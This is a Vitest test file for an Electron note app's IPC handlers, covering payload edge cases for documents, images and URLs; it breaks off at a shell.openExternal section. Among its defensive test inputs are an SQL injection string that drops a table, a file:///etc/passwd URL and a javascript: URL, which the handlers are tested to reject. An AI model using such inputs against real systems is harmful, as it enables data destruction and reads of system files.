/**
 * Tests for IPC payload edge cases — what happens when the renderer
 * sends malformed, incomplete, or unexpected payloads.
 *
 * The frontend is "very heavy" — a complex React + Zustand + Lexical app.
 * Payloads are constructed dynamically from user actions, editor state,
 * and store transformations. Things that can go wrong:
 *
 * 1. Undefined/null fields when the editor hasn't loaded yet
 * 2. Extra fields leaking through (e.g., updateDocument gets the full payload
 *    including `id` alongside title/content)
 * 3. Empty strings vs null vs undefined for optional fields
 * 4. Huge payloads (full document content on every autosave keystroke)
 * 5. Dangerous URLs from pasted content reaching shell.openExternal
 * 6. FileReader data URL format vs raw base64 in images.save
 * 7. Stale image IDs reaching images.getPath after deletion
 *
 * These tests verify the handler + repo layer behaves predictably
 * (either processes correctly or throws cleanly) for each edge case.
 *
 * Call sites audited:
 *   - src/renderer/document-store.ts (list, create, trash, restore, permanentDelete, move, listTrashed)
 *   - src/components/lexical-editor.tsx (update content, update title, update emoji)
 *   - src/components/editor/plugins/image-plugin.tsx (save, download — no .catch on save!)
 *   - src/components/editor/nodes/image-component.tsx (getPath — no .catch!)
 *   - src/components/editor/plugins/link-click-plugin.tsx (openExternal, url.resolve, url.fetchMetadata)
 *   - src/components/editor/nodes/bookmark-component.tsx (openExternal — no .catch!)
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

const handlers = new Map<string, (event: unknown, payload: unknown) => unknown>();

vi.mock('electron', () => ({
  ipcMain: {
    handle: vi.fn((channel: string, handler: (event: unknown, payload: unknown) => unknown) => {
      handlers.set(channel, handler);
    }),
  },
  shell: {
    openExternal: vi.fn().mockResolvedValue(undefined),
  },
}));

vi.mock('../../repos/documents', () => ({
  listDocuments: vi.fn().mockReturnValue([]),
  getDocumentById: vi.fn().mockReturnValue(null),
  createDocument: vi.fn().mockReturnValue({ id: '1', title: '', content: '' }),
  updateDocument: vi.fn().mockReturnValue({ id: '1', title: '' }),
  deleteDocument: vi.fn(),
  trashDocument: vi.fn().mockReturnValue({ document: { id: '1' }, trashedIds: ['1'] }),
  restoreDocument: vi.fn().mockReturnValue({ document: { id: '1' }, restoredIds: ['1'] }),
  listTrashedDocuments: vi.fn().mockReturnValue([]),
  permanentDeleteDocument: vi.fn().mockReturnValue({ deletedIds: ['1'] }),
  moveDocument: vi.fn().mockReturnValue({ id: '1' }),
}));

vi.mock('../../repos/images', () => ({
  saveImage: vi.fn().mockReturnValue({ id: 'img1', filePath: 'img1.png' }),
  getImagePath: vi.fn().mockReturnValue({ filePath: 'img1.png' }),
  downloadImage: vi.fn().mockResolvedValue({ id: 'img1', filePath: 'img1.png' }),
  deleteImage: vi.fn(),
}));

vi.mock('../../repos/url-resolver', () => ({
  resolveUrl: vi.fn().mockResolvedValue({ type: 'unsupported', url: '', reason: '' }),
}));

vi.mock('../../repos/url-metadata', () => ({
  fetchUrlMetadata: vi.fn().mockResolvedValue({ title: '', description: '', imageUrl: '', faviconUrl: '', url: '' }),
}));

import {
  shell,
  registerIpcHandlers,
  docs,
  images,
  urlResolver,
  urlMetadata,
} from './setup';

describe('IPC Payload Edge Cases', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    registerIpcHandlers();
  });

  // ────────────────────────────────────────────────────────
  // documents.list — pagination edge cases
  // ────────────────────────────────────────────────────────

  // document-store.ts loadDocuments: invoke('documents.list', { limit: 500, offset: 0 })
  it('documents.list with the exact payload the store sends', async () => {
    const handler = handlers.get('documents.list')!;
    const result = await handler(null, { limit: 500, offset: 0 });
    expect(result).toEqual({ documents: [] });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: 500, offset: 0 });
  });

  // document-store.ts loadTrashedDocuments: invoke('documents.listTrashed', { limit: 200, offset: 0 })
  it('documents.listTrashed with the exact payload the store sends', async () => {
    const handler = handlers.get('documents.listTrashed')!;
    const result = await handler(null, { limit: 200, offset: 0 });
    expect(result).toEqual({ documents: [] });
    expect(docs.listTrashedDocuments).toHaveBeenCalledWith({ limit: 200, offset: 0 });
  });

  // The frontend sometimes calls documents.list with an empty object
  // (no limit/offset) on initial load. This should work with defaults.
  it('documents.list with empty payload uses defaults', async () => {
    const handler = handlers.get('documents.list')!;
    const result = await handler(null, {});
    expect(result).toEqual({ documents: [] });
    expect(docs.listDocuments).toHaveBeenCalledWith({});
  });

  // The frontend could pass undefined for optional fields when constructing
  // the payload from uninitialized state.
  it('documents.list with undefined limit/offset', async () => {
    const handler = handlers.get('documents.list')!;
    await handler(null, { limit: undefined, offset: undefined });
    expect(docs.listDocuments).toHaveBeenCalledWith({ limit: undefined, offset: undefined });
  });

  // ────────────────────────────────────────────────────────
  // documents.create — from document-store.ts createDocument()
  // ────────────────────────────────────────────────────────

  // document-store.ts: invoke('documents.create', { parentId })
  // parentId defaults to null. The frontend ONLY sends { parentId }.
  it('documents.create with null parentId (the default store call)', async () => {
    const handler = handlers.get('documents.create')!;
    const result = await handler(null, { parentId: null });
    expect(result).toEqual({ document: { id: '1', title: '', content: '' } });
    expect(docs.createDocument).toHaveBeenCalledWith({ parentId: null });
  });

  // Creating a nested note: parentId is a real doc ID.
  it('documents.create with string parentId', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { parentId: 'parent-1' });
    expect(docs.createDocument).toHaveBeenCalledWith({ parentId: 'parent-1' });
  });

  // The store only sends { parentId } — no title, content, or emoji.
  // Verify no extra fields are invented by the handler.
  it('documents.create passes the exact payload to createDocument', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { parentId: null });
    const callArgs = (docs.createDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs).toEqual([{ parentId: null }]);
  });

  // Emoji field — can be a string, null, or undefined. Not sent from the
  // current frontend but the IPC contract allows it.
  it('documents.create with emoji', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { title: 'Celebration', emoji: '🎉' });
    expect(docs.createDocument).toHaveBeenCalledWith({ title: 'Celebration', emoji: '🎉' });
  });

  it('documents.create with null emoji', async () => {
    const handler = handlers.get('documents.create')!;
    await handler(null, { title: 'Plain', emoji: null });
    expect(docs.createDocument).toHaveBeenCalledWith({ title: 'Plain', emoji: null });
  });

  // The store destructures { document } from the response, then reads
  // document.title to check for 'Untitled'. The response shape must be right.
  it('documents.create response is destructurable as { document }', async () => {
    (docs.createDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      id: 'new', title: 'Untitled', content: '', emoji: null, parentId: null,
    });
    const handler = handlers.get('documents.create')!;
    const result = await handler(null, { parentId: null }) as { document: Record<string, unknown> };
    // Simulates: const { document } = result; document.title === 'Untitled'
    expect(result.document).toBeDefined();
    expect(result.document.title).toBe('Untitled');
    expect(result.document.id).toBe('new');
  });

  // ────────────────────────────────────────────────────────
  // documents.update — the autosave path (most jank-prone)
  // ────────────────────────────────────────────────────────

  // lexical-editor.tsx sends the FULL payload including `id`.
  // The handler calls updateDocument(payload.id, payload) — the repo
  // receives the whole payload as the patch object. The extra `id` field
  // in the patch is ignored by updateDocument, but we should verify this.
  it('documents.update receives full payload including id field', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: '1', title: 'Updated', content: '{"root":{"children":[]}}' };
    await handler(null, payload);
    // The handler calls updateDocument('1', { id: '1', title: 'Updated', content: '...' })
    // The second arg is the full payload — the repo ignores the `id` in the patch.
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Content-only autosave (the most frequent call — 600ms debounce on every keystroke).
  // lexical-editor.tsx line 104: invoke("documents.update", { id, content })
  // The title field is absent, not null.
  it('documents.update with content-only (title absent)', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: '1', content: '{"root":{"children":[]}}' };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Title-only autosave (500ms debounce on title input).
  // lexical-editor.tsx line 123: invoke("documents.update", { id, title: newTitle })
  it('documents.update with title-only (content absent)', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: '1', title: 'New Title' };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Empty content string — user deleted everything in the editor.
  it('documents.update with empty string content', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: '1', content: '' };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Empty title — user cleared the title field.
  it('documents.update with empty string title', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = { id: '1', title: '' };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Lexical editor serializes content as JSON. This is what the actual
  // content looks like for a simple paragraph with text.
  it('documents.update with realistic Lexical JSON content', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph',
            children: [{ type: 'text', text: 'Hello world', format: 0, mode: 'normal' }],
            direction: 'ltr',
            format: '',
            indent: 0,
          },
        ],
        direction: 'ltr',
        format: '',
        indent: 0,
        type: 'root',
        version: 1,
      },
    });
    const payload = { id: 'doc-abc', content };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('doc-abc', payload);
    // Verify nothing was mangled in transit
    const receivedContent = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(JSON.parse(receivedContent).root.children[0].type).toBe('paragraph');
  });

  // Lexical JSON with image nodes, code blocks, and nested lists — a complex note.
  it('documents.update with complex Lexical JSON (images, code, lists)', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          { type: 'paragraph', children: [{ type: 'text', text: 'Intro' }] },
          { type: 'image', src: 'img1.png', imageId: 'img-abc', altText: '', width: 600 },
          { type: 'code', language: 'python', children: [{ type: 'text', text: 'print("hello")' }] },
          {
            type: 'list', listType: 'bullet',
            children: [
              { type: 'listitem', children: [{ type: 'text', text: 'item 1' }] },
              { type: 'listitem', children: [
                { type: 'link', url: 'https://example.com', children: [{ type: 'text', text: 'link' }] },
              ] },
            ],
          },
        ],
        type: 'root',
        version: 1,
      },
    });
    await handler(null, { id: '1', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
  });

  // The loading-placeholder filter in lexical-editor.tsx removes loading nodes
  // before sending. Verify the handler passes whatever content it receives
  // (the filter happens on the renderer side, not in the handler).
  it('documents.update with content that had loading placeholders filtered', async () => {
    const handler = handlers.get('documents.update')!;
    // After filtering, only the paragraph remains
    const content = JSON.stringify({
      root: { children: [{ type: 'paragraph', children: [] }], type: 'root', version: 1 },
    });
    await handler(null, { id: '1', content });
    expect(docs.updateDocument).toHaveBeenCalledWith('1', { id: '1', content });
  });

  // Very large content — a note with many images, code blocks, etc.
  // The full Lexical JSON can be hundreds of KB.
  it('documents.update with large content payload (~100KB)', async () => {
    const handler = handlers.get('documents.update')!;
    const largeContent = '{"root":{"children":[' + '"x",'.repeat(25000) + '"x"]}}';
    const payload = { id: '1', content: largeContent };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
    // Verify the content wasn't truncated
    const calledPayload = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(calledPayload.content.length).toBe(largeContent.length);
  });

  // Even larger — 500KB note (heavy user with tons of content)
  it('documents.update with ~500KB content payload', async () => {
    const handler = handlers.get('documents.update')!;
    const content = '{"root":{"children":[{"type":"text","text":"' + 'x'.repeat(500 * 1024) + '"}]}}';
    await handler(null, { id: '1', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received.length).toBe(content.length);
  });

  // Content with special characters — unicode, emoji, null bytes.
  // Lexical JSON can contain arbitrary user text including these.
  it('documents.update with unicode and emoji in content', async () => {
    const handler = handlers.get('documents.update')!;
    const payload = {
      id: '1',
      content: '{"root":{"children":[{"type":"paragraph","children":[{"type":"text","text":"Hello 世界 🌍 café naïve"}]}]}}',
      title: '日本語タイトル 🎌',
    };
    await handler(null, payload);
    expect(docs.updateDocument).toHaveBeenCalledWith('1', payload);
  });

  // Content with characters that could break JSON or SQL if improperly escaped.
  it('documents.update with content containing quotes and backslashes', async () => {
    const handler = handlers.get('documents.update')!;
    const content = '{"root":{"children":[{"type":"text","text":"He said \\"hello\\" and used a \\\\backslash"}]}}';
    await handler(null, { id: '1', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
  });

  // Content with newlines, tabs, and null bytes inside valid JSON structure.
  it('documents.update with control characters in content', async () => {
    const handler = handlers.get('documents.update')!;
    const textWithControls = 'line1\nline2\ttab\r\nwindows\0null';
    const content = JSON.stringify({ root: { children: [{ type: 'text', text: textWithControls }] } });
    await handler(null, { id: '1', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
    expect(received).toContain('\\u0000');
  });

  // Content containing an SQL injection attempt. The handler must pass it
  // through as a plain string — parameterized queries in the repo protect us.
  it('documents.update with SQL-injection-like content', async () => {
    const handler = handlers.get('documents.update')!;
    const sqlInjection = "Robert'); DROP TABLE documents;--";
    const content = JSON.stringify({ root: { children: [{ type: 'text', text: sqlInjection }] } });
    await handler(null, { id: '1', title: sqlInjection, content });
    expect(docs.updateDocument).toHaveBeenCalledWith('1', { id: '1', title: sqlInjection, content });
  });

  // Emoji field update — user sets or clears the note icon.
  // lexical-editor.tsx line 60: invoke("documents.update", { id: documentId, emoji: native })
  it('documents.update with emoji change', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', emoji: '📝' });
    expect(docs.updateDocument).toHaveBeenCalledWith('1', { id: '1', emoji: '📝' });
  });

  // lexical-editor.tsx line 74: invoke("documents.update", { id: documentId, emoji: null })
  it('documents.update clearing emoji to null', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', emoji: null });
    expect(docs.updateDocument).toHaveBeenCalledWith('1', { id: '1', emoji: null });
  });

  // Multi-codepoint emoji — some emoji are multiple Unicode codepoints.
  it('documents.update with multi-codepoint emoji (skin tone, family)', async () => {
    const handler = handlers.get('documents.update')!;
    await handler(null, { id: '1', emoji: '👨‍👩‍👧‍👦' }); // ZWJ family emoji
    expect(docs.updateDocument).toHaveBeenCalledWith('1', { id: '1', emoji: '👨‍👩‍👧‍👦' });
  });

  // The frontend reads specific fields from the update response.
  // lexical-editor.tsx line 106: updateDocumentInStore(doc.id, { content: doc.content, updatedAt: doc.updatedAt })
  // lexical-editor.tsx line 125: updateDocumentInStore(doc.id, { title: doc.title })
  // lexical-editor.tsx line 62: updateDocumentInStore(documentId, { emoji: updated.emoji })
  it('documents.update response contains fields the frontend destructures', async () => {
    (docs.updateDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      id: 'doc-1', title: 'Updated Title', content: '{"root":{}}',
      updatedAt: '2024-01-01T00:00:00Z', emoji: '🎉',
    });
    const handler = handlers.get('documents.update')!;
    const result = await handler(null, { id: 'doc-1', title: 'Updated Title' }) as {
      document: { id: string; title: string; content: string; updatedAt: string; emoji: string };
    };
    // The frontend does: const { document: doc } = result
    const doc = result.document;
    expect(doc.id).toBe('doc-1');
    expect(doc.title).toBe('Updated Title');
    expect(doc.content).toBe('{"root":{}}');
    expect(doc.updatedAt).toBe('2024-01-01T00:00:00Z');
    expect(doc.emoji).toBe('🎉');
  });

  // ────────────────────────────────────────────────────────
  // documents.get — used when loading a note into the editor
  // ────────────────────────────────────────────────────────

  it('documents.get extracts id from payload', async () => {
    const handler = handlers.get('documents.get')!;
    await handler(null, { id: 'doc-xyz' });
    expect(docs.getDocumentById).toHaveBeenCalledWith('doc-xyz');
  });

  // The response can be null — note was deleted by another tab.
  it('documents.get response can contain null document', async () => {
    const handler = handlers.get('documents.get')!;
    const result = await handler(null, { id: 'missing' }) as Record<string, unknown>;
    expect(result).toEqual({ document: null });
  });

  it('documents.get response wraps the repo result in { document }', async () => {
    (docs.getDocumentById as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      id: 'x', title: 'Found', content: '{}',
    });
    const handler = handlers.get('documents.get')!;
    const result = await handler(null, { id: 'x' }) as { document: Record<string, unknown> };
    expect(result.document.id).toBe('x');
    expect(result.document.title).toBe('Found');
  });

  // ────────────────────────────────────────────────────────
  // documents.delete — extracts id from payload
  // ────────────────────────────────────────────────────────

  it('documents.delete extracts id from payload', async () => {
    const handler = handlers.get('documents.delete')!;
    await handler(null, { id: 'doc-to-delete' });
    expect(docs.deleteDocument).toHaveBeenCalledWith('doc-to-delete');
  });

  it('documents.delete response is exactly { ok: true }', async () => {
    const handler = handlers.get('documents.delete')!;
    const result = await handler(null, { id: '1' });
    expect(result).toEqual({ ok: true });
  });

  // ────────────────────────────────────────────────────────
  // documents.trash — from document-store.ts trashDocument()
  // ────────────────────────────────────────────────────────

  // document-store.ts line 182: const { trashedIds } = await invoke('documents.trash', { id })
  it('documents.trash extracts id from payload', async () => {
    const handler = handlers.get('documents.trash')!;
    await handler(null, { id: 'trash-me' });
    expect(docs.trashDocument).toHaveBeenCalledWith('trash-me');
  });

  // The frontend does: new Set(trashedIds) to filter documents.
  // trashedIds must be an array for Set construction.
  it('documents.trash response has trashedIds as array (used for Set construction)', async () => {
    (docs.trashDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      document: { id: 'p' }, trashedIds: ['p', 'c1', 'c2'],
    });
    const handler = handlers.get('documents.trash')!;
    const result = await handler(null, { id: 'p' }) as { trashedIds: string[] };
    expect(Array.isArray(result.trashedIds)).toBe(true);
    // Verify Set construction works (the frontend's exact usage)
    const trashedSet = new Set(result.trashedIds);
    expect(trashedSet.has('p')).toBe(true);
    expect(trashedSet.has('c1')).toBe(true);
    expect(trashedSet.has('c2')).toBe(true);
    expect(trashedSet.size).toBe(3);
  });

  // ────────────────────────────────────────────────────────
  // documents.restore — from document-store.ts restoreDocument()
  // ────────────────────────────────────────────────────────

  it('documents.restore extracts id from payload', async () => {
    const handler = handlers.get('documents.restore')!;
    await handler(null, { id: 'restore-me' });
    expect(docs.restoreDocument).toHaveBeenCalledWith('restore-me');
  });

  it('documents.restore response has restoredIds as array', async () => {
    (docs.restoreDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      document: { id: 'p' }, restoredIds: ['p', 'c1'],
    });
    const handler = handlers.get('documents.restore')!;
    const result = await handler(null, { id: 'p' }) as { restoredIds: string[] };
    expect(Array.isArray(result.restoredIds)).toBe(true);
    expect(result.restoredIds).toEqual(['p', 'c1']);
  });

  // ────────────────────────────────────────────────────────
  // documents.permanentDelete — from document-store.ts
  // ────────────────────────────────────────────────────────

  // document-store.ts line 228: const { deletedIds } = await invoke('documents.permanentDelete', { id })
  it('documents.permanentDelete extracts id from payload', async () => {
    const handler = handlers.get('documents.permanentDelete')!;
    await handler(null, { id: 'nuke-me' });
    expect(docs.permanentDeleteDocument).toHaveBeenCalledWith('nuke-me');
  });

  // The frontend does: new Set(deletedIds) to filter trashedDocuments.
  it('documents.permanentDelete response has deletedIds as array (used for Set)', async () => {
    (docs.permanentDeleteDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      deletedIds: ['p', 'c1', 'c2', 'c3'],
    });
    const handler = handlers.get('documents.permanentDelete')!;
    const result = await handler(null, { id: 'p' }) as { deletedIds: string[] };
    expect(Array.isArray(result.deletedIds)).toBe(true);
    const deletedSet = new Set(result.deletedIds);
    expect(deletedSet.size).toBe(4);
  });

  // ────────────────────────────────────────────────────────
  // documents.move — arg destructuring is critical
  // ────────────────────────────────────────────────────────

  // The handler does: moveDocument(payload.id, payload.parentId, payload.sortOrder)
  // Three separate arguments. If destructuring is wrong (e.g., passing the whole
  // payload), moveDocument gets wrong args and silently corrupts sort order.
  it('documents.move destructures payload into 3 separate arguments', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: 'doc-1', parentId: 'parent-1', sortOrder: 3 });
    expect(docs.moveDocument).toHaveBeenCalledWith('doc-1', 'parent-1', 3);
    // Verify exactly 3 args, not the whole payload object
    const callArgs = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(3);
    expect(typeof callArgs[0]).toBe('string'); // id
    expect(typeof callArgs[1]).toBe('string'); // parentId
    expect(typeof callArgs[2]).toBe('number'); // sortOrder
  });

  // Move to root (parentId: null) — SQL uses IS NULL not = NULL.
  it('documents.move to root with parentId null', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: '1', parentId: null, sortOrder: 0 });
    expect(docs.moveDocument).toHaveBeenCalledWith('1', null, 0);
    // Verify null is actually null, not "null" or undefined
    const parentIdArg = (docs.moveDocument as ReturnType<typeof vi.fn>).mock.calls[0][1];
    expect(parentIdArg).toBeNull();
  });

  // Move to last position — sortOrder equals the sibling count.
  it('documents.move to last position', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: '1', parentId: 'parent', sortOrder: 99 });
    expect(docs.moveDocument).toHaveBeenCalledWith('1', 'parent', 99);
  });

  // Move to position 0 — top of the list.
  it('documents.move to first position', async () => {
    const handler = handlers.get('documents.move')!;
    await handler(null, { id: '1', parentId: 'parent', sortOrder: 0 });
    expect(docs.moveDocument).toHaveBeenCalledWith('1', 'parent', 0);
  });

  // The response is wrapped in { document } — the frontend doesn't use it
  // (it reloads all docs), but the shape must still be correct.
  it('documents.move response wraps result in { document }', async () => {
    (docs.moveDocument as ReturnType<typeof vi.fn>).mockReturnValueOnce({ id: 'moved', parentId: 'p' });
    const handler = handlers.get('documents.move')!;
    const result = await handler(null, { id: 'moved', parentId: 'p', sortOrder: 0 }) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['document']);
    expect(result.document).toEqual({ id: 'moved', parentId: 'p' });
  });

  // ────────────────────────────────────────────────────────
  // images.save — from image-plugin.tsx saveImageAndUpdate()
  // ────────────────────────────────────────────────────────

  // image-plugin.tsx line 50-54:
  //   const base64 = await readFileAsBase64(file)   // returns data URL!
  //   invoke("images.save", { data: base64, mimeType: file.type })
  //
  // readFileAsBase64 uses FileReader.readAsDataURL(), which returns:
  //   "data:image/png;base64,iVBORw0KGgo..."
  // This is NOT raw base64 — it has the prefix. The handler must pass it
  // through to saveImage, which is responsible for stripping the prefix.

  it('images.save with data URL prefix (the format FileReader produces)', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, {
      data: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==',
      mimeType: 'image/png',
    });
    expect(images.saveImage).toHaveBeenCalledWith(
      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==',
      'image/png',
    );
  });

  // JPEG paste
  it('images.save with JPEG data URL', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, {
      data: 'data:image/jpeg;base64,/9j/4AAQSkZJRg==',
      mimeType: 'image/jpeg',
    });
    expect(images.saveImage).toHaveBeenCalledWith(
      'data:image/jpeg;base64,/9j/4AAQSkZJRg==',
      'image/jpeg',
    );
  });

  // GIF paste
  it('images.save with GIF data URL', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, {
      data: 'data:image/gif;base64,R0lGODlh',
      mimeType: 'image/gif',
    });
    expect(images.saveImage).toHaveBeenCalledWith(
      'data:image/gif;base64,R0lGODlh',
      'image/gif',
    );
  });

  // WebP paste
  it('images.save with WebP data URL', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, {
      data: 'data:image/webp;base64,UklGR',
      mimeType: 'image/webp',
    });
    expect(images.saveImage).toHaveBeenCalledWith(
      'data:image/webp;base64,UklGR',
      'image/webp',
    );
  });

  // The handler passes exactly 2 arguments to saveImage.
  it('images.save passes exactly (data, mimeType) — two args', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, { data: 'abc', mimeType: 'image/png' });
    const callArgs = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(2);
    expect(callArgs[0]).toBe('abc');
    expect(callArgs[1]).toBe('image/png');
  });

  // Large image data — a 10MB screenshot encoded as base64 is ~13MB.
  it('images.save with large base64 data (~1MB)', async () => {
    const handler = handlers.get('images.save')!;
    const largeData = 'data:image/png;base64,' + 'A'.repeat(1024 * 1024);
    await handler(null, { data: largeData, mimeType: 'image/png' });
    const received = (images.saveImage as ReturnType<typeof vi.fn>).mock.calls[0][0];
    expect(received.length).toBe(largeData.length);
  });

  // Empty data — user pastes something that resolves to an empty clipboard item.
  it('images.save with empty data string', async () => {
    const handler = handlers.get('images.save')!;
    await handler(null, { data: '', mimeType: 'image/png' });
    expect(images.saveImage).toHaveBeenCalledWith('', 'image/png');
  });

  // The frontend destructures { id, filePath } from the response.
  // image-plugin.tsx line 51: const { id, filePath } = await invoke(...)
  it('images.save response is destructurable as { id, filePath }', async () => {
    (images.saveImage as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      id: 'img-new', filePath: 'img-new.png',
    });
    const handler = handlers.get('images.save')!;
    const result = await handler(null, { data: 'abc', mimeType: 'image/png' }) as {
      id: string; filePath: string;
    };
    expect(result.id).toBe('img-new');
    expect(result.filePath).toBe('img-new.png');
  });

  // ────────────────────────────────────────────────────────
  // images.download — from image-plugin.tsx downloadAndSaveImage()
  // ────────────────────────────────────────────────────────

  // image-plugin.tsx line 82: invoke("images.download", { url })
  // The url comes from pasted markdown or a newly created ImageNode.
  // There is NO url validation on the frontend side.

  it('images.download extracts url from payload', async () => {
    const handler = handlers.get('images.download')!;
    await handler(null, { url: 'https://example.com/photo.jpg' });
    expect(images.downloadImage).toHaveBeenCalledWith('https://example.com/photo.jpg');
    // Verify exactly 1 arg
    const callArgs = (images.downloadImage as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
  });

  // URL with query params and fragment — common for CDN images.
  it('images.download with complex CDN URL', async () => {
    const handler = handlers.get('images.download')!;
    const url = 'https://cdn.example.com/photo.jpg?w=800&q=90&format=auto#section';
    await handler(null, { url });
    expect(images.downloadImage).toHaveBeenCalledWith(url);
  });

  // Very long URL — some image CDNs have extremely long URLs with tokens.
  it('images.download with very long URL (~3KB)', async () => {
    const handler = handlers.get('images.download')!;
    const url = 'https://example.com/img.png?' + 'token='.repeat(500) + 'abc';
    await handler(null, { url });
    expect(images.downloadImage).toHaveBeenCalledWith(url);
  });

  // Dangerous URL schemes are now rejected at the IPC layer.
  it('images.download rejects file:// URL', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: 'file:///etc/passwd' })).rejects.toThrow('Blocked URL scheme');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  it('images.download rejects javascript: URL', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: 'javascript:alert(1)' })).rejects.toThrow('Blocked URL scheme');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  it('images.download rejects relative URL (no scheme)', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: '/images/photo.png' })).rejects.toThrow('Blocked URL scheme');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  it('images.download rejects data: URL', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: 'data:image/png;base64,iVBOR' })).rejects.toThrow('Blocked URL scheme');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  // The frontend destructures { id, filePath } from the response.
  it('images.download response is destructurable as { id, filePath }', async () => {
    (images.downloadImage as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      id: 'dl-1', filePath: 'dl-1.jpg',
    });
    const handler = handlers.get('images.download')!;
    const result = await handler(null, { url: 'https://example.com/img.jpg' }) as {
      id: string; filePath: string;
    };
    expect(result.id).toBe('dl-1');
    expect(result.filePath).toBe('dl-1.jpg');
  });

  // ────────────────────────────────────────────────────────
  // images.getPath — from image-component.tsx useEffect
  // ────────────────────────────────────────────────────────

  // image-component.tsx line 114: invoke("images.getPath", { id: currentImageId })
  // There is NO .catch() on this promise. If it rejects, it's an unhandled rejection.
  // The handler must still pass the id correctly to getImagePath.

  it('images.getPath extracts id from payload', async () => {
    const handler = handlers.get('images.getPath')!;
    await handler(null, { id: 'img-abc' });
    expect(images.getImagePath).toHaveBeenCalledWith('img-abc');
  });

  // The frontend destructures { filePath }.
  it('images.getPath response is destructurable as { filePath }', async () => {
    (images.getImagePath as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      filePath: '/path/to/img-abc.png',
    });
    const handler = handlers.get('images.getPath')!;
    const result = await handler(null, { id: 'img-abc' }) as { filePath: string };
    expect(result.filePath).toBe('/path/to/img-abc.png');
  });

  // Stale image ID — the image was deleted but the Lexical node still references it.
  // The handler passes the stale ID; getImagePath will throw.
  it('images.getPath with stale id propagates repo error', async () => {
    (images.getImagePath as ReturnType<typeof vi.fn>).mockImplementationOnce(() => {
      throw new Error('Image not found: stale-id');
    });
    const handler = handlers.get('images.getPath')!;
    await expect(handler(null, { id: 'stale-id' })).rejects.toThrow('Image not found: stale-id');
  });

  // ────────────────────────────────────────────────────────
  // images.delete — extracts id from payload
  // ────────────────────────────────────────────────────────

  it('images.delete extracts id from payload', async () => {
    const handler = handlers.get('images.delete')!;
    await handler(null, { id: 'img-to-delete' });
    expect(images.deleteImage).toHaveBeenCalledWith('img-to-delete');
  });

  it('images.delete response is exactly { ok: true }', async () => {
    const handler = handlers.get('images.delete')!;
    const result = await handler(null, { id: 'img1' });
    expect(result).toEqual({ ok: true });
  });

  // ────────────────────────────────────────────────────────
  // shell.openExternal — from multiple call sites
  // ────────────────────────────────────────────────────────

  // Called from:
  //   - link-click-plugin.tsx line 26: invoke("shell.openExternal", { url })  — has .catch()
  //   - image-component.tsx line 300: invoke("shell.openExternal", { url })   — NO .catch()
